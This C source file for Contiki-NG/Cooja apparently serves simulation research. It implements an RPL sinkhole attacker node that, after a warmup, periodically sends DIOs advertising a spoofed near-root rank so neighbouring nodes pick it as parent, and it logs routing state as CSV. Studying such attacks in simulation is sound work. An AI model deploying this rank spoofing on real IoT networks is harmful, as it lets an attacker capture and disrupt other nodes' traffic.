/*
 * sinkhole_attacker.c
 * Sinkhole attacker for Contiki-NG / Cooja
 *
 * Behaviour:
 *   - Joins the DODAG normally
 *   - After ATTACK_WARMUP_SECONDS, periodically emits fake low-rank DIOs
 *     so nearby nodes prefer it as parent
 *   - Does not generate application traffic; it replaces a normal sender
 *
 * CSV output:
 *   CSV,PROTOCOL,<id>,SINKHOLE
 *   CSV,LLADDR,<id>,<hex>
 *   CSV,ATTACK_PARAMS,<id>,mode=sinkhole,warmup=<s>,rank_delta=<d>,dio_period=<s>
 *   CSV,ATTACK_ENABLED,<id>
 *   CSV,SINKHOLE_DIO,<id>,<count>
 *   CSV,PARENT,<id>,<ip|none>
 *   CSV,ROUTING,<id>,<joined>,<parent_ip>,<rank>
 */

#include "contiki.h"
#include "sys/log.h"
#include "net/ipv6/uip.h"
#include "net/ipv6/uiplib.h"
#include "net/routing/routing.h"
#include "net/routing/rpl-classic/rpl.h"
#include "net/routing/rpl-classic/rpl-private.h"

#include <stdint.h>
#include <stdio.h>

#define LOG_MODULE "SINKHOLE"
#define LOG_LEVEL  LOG_LEVEL_WARN

#ifndef ATTACK_WARMUP_SECONDS
#define ATTACK_WARMUP_SECONDS 350
#endif

#ifndef ROUTING_DIS_INT
#define ROUTING_DIS_INT (20 * CLOCK_SECOND)
#endif

#ifndef SINKHOLE_DIO_PERIOD_SECONDS
#define SINKHOLE_DIO_PERIOD_SECONDS 15
#endif

#define SINKHOLE_DIO_PERIOD ((clock_time_t)SINKHOLE_DIO_PERIOD_SECONDS * CLOCK_SECOND)

#ifndef SINKHOLE_RANK_DELTA
#define SINKHOLE_RANK_DELTA 1
#endif

static uint8_t attack_enabled;
static uint32_t dio_count;

void
brpl_parent_switch_callback(rpl_parent_t *old_p, rpl_parent_t *new_p)
{
  (void)old_p;
  (void)new_p;
}

uint8_t
sinkhole_attack_is_enabled(void)
{
  return attack_enabled;
}

static void
log_preferred_parent(void)
{
  rpl_dag_t *dag = rpl_get_any_dag();
  unsigned id = (unsigned)linkaddr_node_addr.u8[LINKADDR_SIZE - 1];

  if(dag == NULL || dag->preferred_parent == NULL) {
    printf("CSV,PARENT,%u,none\n", id);
    return;
  }

  printf("CSV,PARENT,%u,", id);
  {
    const uip_ipaddr_t *paddr = rpl_parent_get_ipaddr(dag->preferred_parent);
    if(paddr != NULL) {
      uiplib_ipaddr_print(paddr);
    } else {
      printf("unknown");
    }
  }
  printf("\n");
}

static void
log_routing_status(void)
{
  rpl_dag_t *dag = rpl_get_any_dag();
  unsigned id = (unsigned)linkaddr_node_addr.u8[LINKADDR_SIZE - 1];
  unsigned joined = NETSTACK_ROUTING.node_has_joined() ? 1 : 0;

  printf("CSV,ROUTING,%u,%u,", id, joined);
  if(dag != NULL && dag->preferred_parent != NULL) {
    const uip_ipaddr_t *paddr = rpl_parent_get_ipaddr(dag->preferred_parent);
    if(paddr != NULL) {
      uiplib_ipaddr_print(paddr);
      printf(",%u\n", (unsigned)dag->rank);
      return;
    }
  }
  printf("none,0\n");
}

static void
emit_sinkhole_dio(void)
{
  rpl_instance_t *instance = rpl_get_default_instance();
  rpl_dag_t *dag;
  rpl_rank_t saved_rank;

  if(instance == NULL || instance->current_dag == NULL) {
    return;
  }

  dag = instance->current_dag;

  /* Spoof a low rank so nearby nodes elect us as preferred parent.
   * ROOT_RANK(instance) = instance->min_hoprankinc (typically 256).
   * SINKHOLE_RANK_DELTA=1 → advertised rank = 257, i.e. one unit
   * above root, well below our real rank (root + 1 hop = ~512).
   * We restore the real rank immediately after so that our own
   * routing decisions are unaffected. */
  saved_rank = dag->rank;
  dag->rank  = (rpl_rank_t)(ROOT_RANK(instance) + SINKHOLE_RANK_DELTA);

  dio_output(instance, NULL);

  dag->rank = saved_rank;

  dio_count++;
  printf("CSV,SINKHOLE_DIO,%u,%lu,%u\n",
         (unsigned)linkaddr_node_addr.u8[LINKADDR_SIZE - 1],
         (unsigned long)dio_count,
         (unsigned)(ROOT_RANK(instance) + SINKHOLE_RANK_DELTA));
}

PROCESS(sinkhole_attacker_process, "Sinkhole attacker");
AUTOSTART_PROCESSES(&sinkhole_attacker_process);

PROCESS_THREAD(sinkhole_attacker_process, ev, data)
{
  static struct etimer attack_timer;
  static struct etimer dis_timer;
  static struct etimer dio_timer;
  static struct etimer status_timer;

  (void)ev;
  (void)data;

  PROCESS_BEGIN();

  attack_enabled = 0;
  dio_count = 0;

  {
    unsigned id = (unsigned)linkaddr_node_addr.u8[LINKADDR_SIZE - 1];
    uint8_t i;

    printf("CSV,PROTOCOL,%u,SINKHOLE\n", id);
    printf("CSV,LLADDR,%u,", id);
    for(i = 0; i < LINKADDR_SIZE; i++) {
      printf("%02x", linkaddr_node_addr.u8[i]);
      if(i + 1 < LINKADDR_SIZE) {
        printf(":");
      }
    }
    printf("\n");
    printf("CSV,ATTACK_PARAMS,%u,mode=sinkhole,warmup=%u,rank_delta=%u,dio_period=%u\n",
           id,
           (unsigned)ATTACK_WARMUP_SECONDS,
           (unsigned)SINKHOLE_RANK_DELTA,
           (unsigned)SINKHOLE_DIO_PERIOD_SECONDS);
  }

  etimer_set(&attack_timer, (clock_time_t)ATTACK_WARMUP_SECONDS * CLOCK_SECOND);
  etimer_set(&dis_timer, 30 * CLOCK_SECOND);
  etimer_set(&status_timer, 30 * CLOCK_SECOND);

  while(1) {
    PROCESS_WAIT_EVENT();

    if(!attack_enabled && etimer_expired(&attack_timer)) {
      attack_enabled = 1;
      printf("CSV,ATTACK_ENABLED,%u\n",
             (unsigned)linkaddr_node_addr.u8[LINKADDR_SIZE - 1]);
      etimer_set(&dio_timer, CLOCK_SECOND);
    }

    if(etimer_expired(&dis_timer)) {
      if(!NETSTACK_ROUTING.node_has_joined()) {
        dis_output(NULL);
      }
      etimer_reset(&dis_timer);
    }

    if(attack_enabled && etimer_expired(&dio_timer)) {
      if(NETSTACK_ROUTING.node_has_joined()) {
        emit_sinkhole_dio();
      }
      etimer_reset_with_new_interval(&dio_timer, SINKHOLE_DIO_PERIOD);
    }

    if(etimer_expired(&status_timer)) {
      log_preferred_parent();
      log_routing_status();
      etimer_reset(&status_timer);
    }
  }

  PROCESS_END();
}
